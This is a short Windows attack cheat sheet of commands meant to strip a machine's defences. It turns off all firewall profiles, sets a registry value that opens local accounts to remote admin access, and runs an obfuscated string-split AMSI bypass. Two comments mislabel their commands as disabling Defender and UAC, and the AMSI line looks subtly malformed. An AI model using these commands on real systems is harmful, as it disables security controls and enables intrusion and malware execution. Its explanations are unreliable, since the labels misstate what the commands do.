# Disable WinDefender 
netsh advfirewall set allprofiles state off

# Disable UAC
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

# Bypass AMSI
$Oops='.SetValue($null,$true)'
[Ref].Assembly.GetType('Sy'+'ste'+'m.'+'Man'+'ag'+'eme'+'nt'+'.Au'+'to'+'mat'+'io'+'n.A'+'ms'+'iUt'+'ils').GetField('ams'+'iI'+'nit'+'Fa'+'iled','No'+'nPu'+'bl'+'ic,'+'St'+'atic').$Oops
